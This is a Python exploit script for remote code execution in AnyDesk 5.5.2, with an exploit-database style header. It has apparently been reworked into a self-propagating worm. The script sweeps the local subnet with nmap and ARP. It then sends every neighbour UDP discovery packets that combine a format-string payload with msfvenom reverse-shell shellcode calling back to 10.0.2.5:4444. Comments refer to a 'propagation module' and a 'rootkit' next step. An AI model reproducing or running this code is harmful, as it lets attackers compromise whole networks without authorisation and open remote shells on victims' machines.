# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress
import re

def ping_sweep(network):
    # Run nmap for a ping sweep
    try:
        output = subprocess.check_output(['nmap', '-sn', network], text=True)
        return output
    except subprocess.CalledProcessError as e:
        return ""

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_arp_neighbors(interface):
    # Get the network details
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    network_str = str(network)
    # Perform a ping sweep to populate the ARP table
    ping_sweep(network_str)
    # Execute the arp command and get the output
    arp_output = subprocess.check_output(['arp', '-a'], text=True)
    # Initialize an empty list to hold the neighbor IPs
    neighbors = []

    # Iterate over each line of the arp command output
    for line in arp_output.splitlines():
        # Use regular expression to extract the IP address
        match = re.search(r'\(([^)]+)\)', line)
        if match:
            # Extract the IP address
            ip_address = match.group(1)

            # Extract the interface information
            if interface in line:
                print(neighbors)
                neighbors.append(ip_address)
			
    return neighbors

def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d


# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xee\xca\xd4"
shellcode += b"\xb4\xc6\x9c\x61\x2d\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x84\xe3\x8c\x2d\xac"
shellcode += b"\x9e\x3e\x47\xef\x94\xdb\xb1\x8e\x0b\x29\x94"
shellcode += b"\xec\xca\xc5\xe8\xcc\x9c\x63\x28\xbf\x82\x5d"
shellcode += b"\x52\xac\x8c\x3b\x47\xc4\x92\xdb\xb1\xac\x9f"
shellcode += b"\x3f\x65\x11\x04\xbe\x95\x9e\x93\x64\x58\x18"
shellcode += b"\xa0\xef\xec\x5f\xd4\xda\x02\x8c\xa3\xba\x9b"
shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"

#def run():
#    next_action = ""
#    data = ""
#    print("[+] Propagation module activated...")


try:
    interface = get_interface()
    port = 50001  # Define the port to scan
    neighbors = get_arp_neighbors(interface)

    for ip in neighbors:
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
        print('reverse shell should connect within 5 seconds')
        
except Exception as e:
    print(f"An error occurred: {e}")
    exit()

#    next_action = "rootkit"
#    return data, next_action
